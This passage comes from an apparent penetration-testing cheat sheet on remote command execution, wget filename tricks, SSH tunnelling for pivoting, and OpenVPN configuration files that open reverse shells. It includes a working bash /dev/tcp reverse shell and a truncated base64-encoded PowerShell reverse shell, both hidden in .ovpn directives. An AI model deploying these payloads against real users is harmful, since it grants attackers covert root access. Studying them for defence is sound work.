<div><p>The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="id26">
<h3>Wget<a class="headerlink" href="#id26" title="Link to this heading"></a></h3>
<section id="ftp-via-wget">
<h4>FTP via Wget<a class="headerlink" href="#ftp-via-wget" title="Link to this heading"></a></h4>
<p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="o">-</span><span class="n">rq</span> <span class="n">ftp</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">user</span><span class="o">=</span><span class="n">username</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">password</span><span class="o">=</span><span class="n">password</span>
</pre></div>
</div>
</section>
<section id="wgetrc-commands">
<h4>wgetrc Commands<a class="headerlink" href="#wgetrc-commands" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>output_document = file -- Set the output filename—the same as ‘-O file’.
post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
-P prefix
--directory-prefix=prefix
  Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
</pre></div>
</div>
</section>
<section id="tricks">
<h4>Tricks<a class="headerlink" href="#tricks" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let’s say, your current directory is /home/user/ if we do</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="n">IPAddress</span> <span class="o">-</span><span class="n">P</span> <span class="n">tmp</span>
</pre></div>
</div>
<p>it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.</p>
</div></blockquote>
<ul class="simple">
<li><p>wget accepts IP address in decimal format</p></li>
<li><p>wget shortens the filename if it’s too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (<a href="#id27"><span class="problematic" id="id28">*</span></a>255/ somenumber).php.jpg and wget shortens it to aaaaaaa(<a href="#id29"><span class="problematic" id="id30">*</span></a>255).php</p></li>
</ul>
</section>
</section>
<section id="ssh">
<h3>SSH<a class="headerlink" href="#ssh" title="Link to this heading"></a></h3>
<section id="ssh-config">
<h4>ssh_config<a class="headerlink" href="#ssh-config" title="Link to this heading"></a></h4>
<p>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">## Tighten security after security incident</span>
<span class="c1">## root never gets to log in remotely PermitRootLogin no</span>
<span class="c1">## Eugene &amp; Margo can SSH in, no-one else allowed</span>
<span class="n">AllowUsers</span> <span class="n">example_user1</span> <span class="n">example_user2</span>
<span class="c1">## SSH keys only but example_user1 can use a password</span>
<span class="n">Match</span> <span class="n">user</span> <span class="n">example_user1</span>
<span class="n">PasswordAuthentication</span> <span class="n">yes</span>
<span class="c1">## End tighten security</span>
</pre></div>
</div>
</section>
</section>
<section id="ssh-tunneling">
<h3>SSH Tunneling<a class="headerlink" href="#ssh-tunneling" title="Link to this heading"></a></h3>
<p>SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.</p>
<section id="local-port-forwarding">
<h4>Local Port Forwarding<a class="headerlink" href="#local-port-forwarding" title="Link to this heading"></a></h4>
<p>SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">sshserver</span> <span class="o">-</span><span class="n">L</span> <span class="o">&lt;</span><span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">remote</span> <span class="n">port</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Example:</p>
<p>Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ ssh -L 9000:imgur.com:80 user@example.com
</pre></div>
</div>
<p>The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000</p>
<p><strong>Syntax</strong></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>-L [bind_address:]port:host:hostport
-L [bind_address:]port:remote_socket
-L local_socket:host:hostport
-L local_socket:remote_socket
        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on
        the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port
        hostport, or the Unix socket remote_socket, from the remote machine.

        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.

        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be
        bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.
</pre></div>
</div>
<p>To share a interesting case, Let’s say there’s a host which is running port 22 on all interfaces and port 8080 and 8081 (or any other port) on local loopback interface (127.0.0.1), something like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="o">*.</span><span class="n">ssh</span>                  <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="o">*.</span><span class="n">ssh</span>                  <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="n">localhost</span><span class="mf">.8080</span>         <span class="o">*.*</span>                    <span class="n">LISTEN</span>
<span class="n">tcp4</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="n">localhost</span><span class="mf">.8081</span>         <span class="o">*.*</span>                    <span class="n">LISTEN</span>
</pre></div>
</div>
<p>Now, webserver on port 8080 and 8081 are running on localhost, if we have ssh access to the machine, we can tunnel them via local port forwarding and run it on the ethernet interface.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="n">IP_Address_of_Machine</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Port</span><span class="o">-</span><span class="n">which</span><span class="o">-</span><span class="n">we</span><span class="o">-</span><span class="n">want</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="n">Let</span><span class="s1">&#39;s say-9000&gt;:127.0.0.1:&lt;localhost-port-which-we-want-to-map-let&#39;</span><span class="n">s</span><span class="o">-</span><span class="n">say</span><span class="o">-</span><span class="mi">8080</span><span class="o">&gt;</span> <span class="n">user</span><span class="nd">@IP_Address_of_Machine</span>
</pre></div>
</div>
<p>It would become</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">9000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8080</span> <span class="n">user</span><span class="o">@</span><span class="mf">10.10.10.10</span> <span class="ow">and</span>
<span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mf">10.10.10.10</span><span class="p">:</span><span class="mi">9001</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8081</span> <span class="n">user</span><span class="o">@</span><span class="mf">10.10.10.10</span>
</pre></div>
</div>
<p>The above would open port 9000 and 9001 (on the external interface) and map it to port 8080 and 8081(which were running on local/ loopback interface).</p>
</section>
<section id="remote-port-forwarding">
<h4>Remote Port Forwarding<a class="headerlink" href="#remote-port-forwarding" title="Link to this heading"></a></h4>
<p>SSH remote port forwarding allows us to tunnel a remote port to a local server.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">sshserver</span> <span class="o">-</span><span class="n">R</span> <span class="o">&lt;</span><span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">bind</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">local</span> <span class="n">host</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">local</span> <span class="n">port</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Example:</p>
<p>Let’s say there’s a wordpress web-application we have compromised and have a www-data shell. Also, let’s say, we are inside a docker environment with the network below</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">172.16.0.1</span> <span class="n">Host</span><span class="o">-</span><span class="n">Machine</span>
<span class="mf">172.16.0.2</span> <span class="n">WordPress</span>
<span class="mf">172.16.0.3</span> <span class="n">Joomla</span>
<span class="mf">172.16.0.4</span> <span class="n">Mysql</span>
</pre></div>
</div>
<p>Now, Let’s say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let’s say our IP is 10.10.15.111), creating a Remote Port Forward</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">bitvijays</span><span class="o">@</span><span class="mf">10.10.15.111</span> <span class="o">-</span><span class="n">R</span> <span class="mi">3306</span><span class="p">:</span><span class="mf">172.16.0.4</span><span class="p">:</span><span class="mi">3306</span>
</pre></div>
</div>
<p>The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.</p>
<p>As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="n">StrictHostKeyChecking</span><span class="o">=</span><span class="n">no</span> <span class="o">-</span><span class="n">o</span> <span class="n">UserKnownHostsFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">o</span> <span class="n">GlobalKnownHostsFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span> <span class="o">-</span><span class="n">R</span> <span class="mi">3306</span><span class="p">:</span><span class="mf">172.16.0.4</span><span class="p">:</span><span class="mi">3306</span> <span class="o">-</span><span class="n">fN</span> <span class="n">bitvijays</span><span class="o">@</span><span class="mf">10.10.15.111</span>
</pre></div>
</div>
</section>
<section id="ssh-as-socks-proxy">
<h4>SSH as SOCKS Proxy<a class="headerlink" href="#ssh-as-socks-proxy" title="Link to this heading"></a></h4>
<p>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ssh -D localhost:9050 user@host

-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
</pre></div>
</div>
<p>and</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">proxychains4</span> <span class="n">remmina</span><span class="o">/</span> <span class="n">rdesktop</span>
</pre></div>
</div>
</section>
<section id="vpn-like-tunnelling">
<h4>VPN-like tunnelling?<a class="headerlink" href="#vpn-like-tunnelling" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/sshuttle/sshuttle">sshuttle</a> Transparent proxy server that works as a poor man’s VPN. Forwards over ssh. Doesn’t require admin. Works with Linux and MacOS. Supports DNS tunneling.</p>
<p>So if we have a access to device at 10.1.1.1, and it also has an interface on 192.168.122.0/24 with other hosts behind it, we can run:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># sshuttle -r root@10.1.1.1 192.168.122.0/24</span>
<span class="n">root</span><span class="o">@</span><span class="mf">10.1.1.1</span><span class="s1">&#39;s password:</span>
<span class="n">client</span><span class="p">:</span> <span class="n">Connected</span><span class="o">.</span>
</pre></div>
</div>
<p>This creates a VPN-like connection, allowing me to visit 192.168.122.4 in a browser or with curl, and see the result.</p>
<p>Probably, nmap won’t be a good idea to run over sshuttle, however, it is a very nice way to interact with a host over a tunnel.</p>
</section>
<section id="scp">
<h4>SCP<a class="headerlink" href="#scp" title="Link to this heading"></a></h4>
<p>To copy all from Local Location to Remote Location (Upload)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">scp</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">from</span><span class="o">/</span><span class="n">destination</span> <span class="n">username</span><span class="nd">@hostname</span><span class="p">:</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">destination</span>
</pre></div>
</div>
<p>To copy all from Remote Location to Local Location (Download)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">scp</span> <span class="o">-</span><span class="n">r</span> <span class="n">username</span><span class="nd">@hostname</span><span class="p">:</span><span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">from</span><span class="o">/</span><span class="n">destination</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">destination</span>
</pre></div>
</div>
<p>Help:</p>
<ul class="simple">
<li><p>-r Recursively copy all directories and files</p></li>
<li><p>Always use full location from /, Get full location by pwd</p></li>
<li><p>scp will replace all existing files</p></li>
<li><p>hostname will be hostname or IP address</p></li>
<li><p>If custom port is needed (besides port 22) use -P portnumber</p></li>
<li><p>. (dot) - it means current working directory, So download/copy from server and paste here only.</p></li>
</ul>
</section>
</section>
<section id="plink">
<h3>Plink<a class="headerlink" href="#plink" title="Link to this heading"></a></h3>
<p>Plink is a windows command-line connection tool similar to UNIX ssh.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">plink</span>
<span class="n">Plink</span><span class="p">:</span> <span class="n">command</span><span class="o">-</span><span class="n">line</span> <span class="n">connection</span> <span class="n">utility</span>
<span class="n">Release</span> <span class="mf">0.68</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">plink</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="p">[</span><span class="n">user</span><span class="o">@</span><span class="p">]</span><span class="n">host</span> <span class="p">[</span><span class="n">command</span><span class="p">]</span>
      <span class="p">(</span><span class="s2">&quot;host&quot;</span> <span class="n">can</span> <span class="n">also</span> <span class="n">be</span> <span class="n">a</span> <span class="n">PuTTY</span> <span class="n">saved</span> <span class="n">session</span> <span class="n">name</span><span class="p">)</span>
<span class="n">Options</span><span class="p">:</span>
 <span class="o">-</span><span class="n">V</span>        <span class="nb">print</span> <span class="n">version</span> <span class="n">information</span> <span class="ow">and</span> <span class="n">exit</span>
 <span class="o">-</span><span class="n">v</span>        <span class="n">show</span> <span class="n">verbose</span> <span class="n">messages</span>
 <span class="o">-</span><span class="n">load</span> <span class="n">sessname</span>  <span class="n">Load</span> <span class="n">settings</span> <span class="kn">from</span> <span class="nn">saved</span> <span class="n">session</span>
 <span class="o">-</span><span class="n">ssh</span> <span class="o">-</span><span class="n">telnet</span> <span class="o">-</span><span class="n">rlogin</span> <span class="o">-</span><span class="n">raw</span> <span class="o">-</span><span class="n">serial</span>
           <span class="n">force</span> <span class="n">use</span> <span class="n">of</span> <span class="n">a</span> <span class="n">particular</span> <span class="n">protocol</span>
 <span class="o">-</span><span class="n">P</span> <span class="n">port</span>   <span class="n">connect</span> <span class="n">to</span> <span class="n">specified</span> <span class="n">port</span>
 <span class="o">-</span><span class="n">l</span> <span class="n">user</span>   <span class="n">connect</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">username</span>
<span class="n">The</span> <span class="n">following</span> <span class="n">options</span> <span class="n">only</span> <span class="n">apply</span> <span class="n">to</span> <span class="n">SSH</span> <span class="n">connections</span><span class="p">:</span>
 <span class="o">-</span><span class="n">pw</span> <span class="n">passw</span> <span class="n">login</span> <span class="k">with</span> <span class="n">specified</span> <span class="n">password</span>
 <span class="o">-</span><span class="n">D</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span>
           <span class="n">Dynamic</span> <span class="n">SOCKS</span><span class="o">-</span><span class="n">based</span> <span class="n">port</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">L</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="n">Forward</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">address</span>
 <span class="o">-</span><span class="n">R</span> <span class="p">[</span><span class="n">listen</span><span class="o">-</span><span class="n">IP</span><span class="p">:]</span><span class="n">listen</span><span class="o">-</span><span class="n">port</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="n">Forward</span> <span class="n">remote</span> <span class="n">port</span> <span class="n">to</span> <span class="n">local</span> <span class="n">address</span>
 <span class="o">-</span><span class="n">X</span> <span class="o">-</span><span class="n">x</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">X11</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">a</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">agent</span> <span class="n">forwarding</span>
 <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">T</span>     <span class="n">enable</span> <span class="o">/</span> <span class="n">disable</span> <span class="n">pty</span> <span class="n">allocation</span>
 <span class="o">-</span><span class="n">C</span>        <span class="n">enable</span> <span class="n">compression</span>
 <span class="o">-</span><span class="n">i</span> <span class="n">key</span>    <span class="n">private</span> <span class="n">key</span> <span class="n">file</span> <span class="k">for</span> <span class="n">user</span> <span class="n">authentication</span>
 <span class="o">-</span><span class="n">m</span> <span class="n">file</span>   <span class="n">read</span> <span class="n">remote</span> <span class="n">command</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="kn">from</span> <span class="nn">file</span>
 <span class="o">-</span><span class="n">N</span>        <span class="n">don</span><span class="s1">&#39;t start a shell/command (SSH-2 only)</span>
 <span class="o">-</span><span class="n">nc</span> <span class="n">host</span><span class="p">:</span><span class="n">port</span>
           <span class="nb">open</span> <span class="n">tunnel</span> <span class="ow">in</span> <span class="n">place</span> <span class="n">of</span> <span class="n">session</span> <span class="p">(</span><span class="n">SSH</span><span class="o">-</span><span class="mi">2</span> <span class="n">only</span><span class="p">)</span>
</pre></div>
</div>
<p>It can also be used to perform SSH tunnelling, have a look at -L, -R and -D options. On Kali Linux box it is present at /usr/share/windows-binaries/plink.exe</p>
</section>
<section id="openvpn-configuration-file-reverse-shell">
<h3>OpenVPN Configuration File Reverse Shell?<a class="headerlink" href="#openvpn-configuration-file-reverse-shell" title="Link to this heading"></a></h3>
<p>Taken from <a class="reference external" href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">Reverse Shell from an OpenVPN Configuration File</a></p>
<p>An ovpn file is a configuration file provided to the OpenVPN client or server. The file details everything about the VPN connection: which remote servers to connect to, the crypto to use, which protocols, the user to login as, etc.</p>
<p>At its most simple form, an ovpn file looks like the this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">remote</span> <span class="mf">192.168.1.245</span>
<span class="n">ifconfig</span> <span class="mf">10.200.0.2</span> <span class="mf">10.200.0.1</span>
<span class="n">dev</span> <span class="n">tun</span>
</pre></div>
</div>
<p>This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1).</p>
<p>The OpenVPN configuration feature is important is the up command. This is how the manual describes it:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Run command cmd after successful TUN/TAP device open (pre — user UID change).
cmd consists of a path to script (or executable program), optionally followed by arguments. The path and arguments may be single- or double-quoted and/or escaped using a backslash, and should be separated by one or more spaces.
</pre></div>
</div>
<p>Basically, the up command will execute any binary of script you point it to</p>
<section id="linux">
<h4>Linux<a class="headerlink" href="#linux" title="Link to this heading"></a></h4>
<p>If the victim is using a version of Bash that supports /dev/tcp then getting a reverse shell is trivial. The following ovpn file will background a reverse shell to 192.168.1.218:8181.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">remote</span> <span class="mf">192.168.1.245</span>
<span class="n">ifconfig</span> <span class="mf">10.200.0.2</span> <span class="mf">10.200.0.1</span>
<span class="n">dev</span> <span class="n">tun</span>
<span class="n">script</span><span class="o">-</span><span class="n">security</span> <span class="mi">2</span>
<span class="n">up</span> <span class="s2">&quot;/bin/bash -c &#39;/bin/bash -i &gt; /dev/tcp/192.168.1.218/8181 0&lt;&amp;1 2&gt;&amp;1 &amp;&#39;&quot;</span>
</pre></div>
</div>
<p>When this ovpn file is used it won’t be obvious to the user that something is wrong. The VPN connection is established normally and traffic flows. There are only two indications in the log that perhaps something is afoot.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Thu Jun 7 12:28:23 2018 NOTE: the current — script-security setting may allow this configuration to call user-defined scripts
Thu Jun 7 12:28:23 2018 ******* WARNING *******: All encryption and authentication features disabled — All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
</pre></div>
</div>
<p>Even if the the user does see these log entries a reverse shell has already been established with our listener on 192.168.1.218:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.247] port 8181 [tcp/*] accepted (family 2, sport 54836)
root@client:/home/client/openvpn# id
id
uid=0(root) gid=0(root) groups=0(root)
</pre></div>
</div>
</section>
<section id="id31">
<h4>Windows<a class="headerlink" href="#id31" title="Link to this heading"></a></h4>
<p>Windows doesn’t have an analogous /dev/tcp feature. We’ll have to work a little harder to generate a reverse shell from a Windows host.</p>
<p>Fortunately, Dave Kennedy of TrustedSec wrote a small <a class="reference external" href="https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell">powershell reverse shell</a> that we can use. Using powershell.exe’s -EncodedCommand
parameter we can pass the entire script on the command line. First, however, we’ll need to base64 encode the script to avoid having to insert escapes. Our old friend Carlos Perez has a script called <a class="reference external" href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">ps_encoder.py</a>
that will do the encoding for us.</p>
<p>However, there is a problem. The encoded reverse shell script is over 4000 characters long and OpenVPN has a 256 character limitation. To get around this we can use the setenv command to split up the script and then recombine it in the up command. Consider the following ovpn file:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ifconfig 10.200.0.2 10.200.0.1
dev tun
remote 192.168.1.245
script-security 2
setenv z1 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
setenv a1 ‘ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsADQAKAGkAZgAgACgAJABjAGwAaQBlAG4AdAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAfQANAAoAaQBmACAAKAAkAHAAcgBvAGMAZQBzAHMALgBFAHgAaQB0AEM’
setenv b1 ‘AbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAkAHAAcgBvAGMAZQBzAHMALgBDAGwAbwBzAGUAKAApAH0ADQAKAGUAeABpAHQAfQANAAoAJABhAGQAZAByAGUAcwBzACAAPQAgACcAMQA5ADIALgAxADYAOAAuADEALgAyADEAOAAnAA0ACgAkAHAAbwByAHQAIAA9ACAAJwA4ADEAOAAxACcADQAKACQAYwBsAG’
setenv c1 ‘kAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgBzAG8AYwBrAGUAdABzAC4AdABjAHAAYwBsAGkAZQBuAHQADQAKACQAYwBsAGkAZQBuAHQALgBjAG8AbgBuAGUAYwB0ACgAJABhAGQAZAByAGUAcwBzACwAJABwAG8AcgB0ACkADQAKACQAcwB0AHIAZQBhAG0AIAA9A’
setenv d1 ‘CAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQANAAoAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABjAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAN’
setenv e1 ‘AAoAJABwAHIAbwBjAGUAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMADQAKACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACcAQwA6AFwAXAB3AGkAbgB’
setenv f1 ‘kAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAJwANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAAxAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbw’
setenv g1 ‘AuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAIAA9ACAAMQANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAwAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApAA0ACgAkAGkAb’
setenv h1 ‘gBwAHUAdABzAHQAcgBlAGEAbQAgAD0AIAAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQASQBuAHAAdQB0AA0ACgAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtACAAPQAgACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAA’
setenv i1 ‘MQANAAoAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcADQAKAHcAaABpAGwAZQAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBQAGUAZQBrACgAKQAgAC0AbgBlACAALQAxACkAewAkAG8’
setenv j1 ‘AdQB0ACAAKwA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsAD’
setenv k1 ‘AALAAkAG8AdQB0AC4ATABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwAOwAgACQAZABvAG4AZQAgAD0AIAAkAGYAYQBsAHMAZQA7ACAAJAB0AGUAcwB0AGkAbgBnACAAPQAgADAAOwANAAoAdwBoAGkAbABlACAAKAAtAG4AbwB0ACAAJABkAG8AbgBlACkAIAB7AA0ACgBpAGYAIAAoACQAYwBsA’
